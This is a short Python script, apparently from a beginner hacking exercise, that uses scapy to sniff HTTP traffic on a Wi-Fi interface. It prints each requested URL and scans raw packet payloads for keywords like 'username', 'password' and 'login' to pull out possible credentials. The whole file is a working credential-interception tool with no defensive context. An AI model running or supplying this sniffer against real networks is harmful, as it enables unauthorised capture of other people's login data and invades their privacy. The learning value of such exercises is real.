import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)

def process_packet(packet):
    print("new packet")
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"url is {url}")
        cred = get_credentials(packet)
        if cred:
            print("Print possible credential info")

def get_url(packet):
    return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode("utf-8")

keywords = {"username", "user", "password", "login", "uname", "signin", "signup", "name", "pass"}
def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        field_load = packet[scapy.Raw].load.decode("utf-8")
        for keyword in keywords:
            if keyword in field_load:
                return field_load

sniff("Wi-Fi")
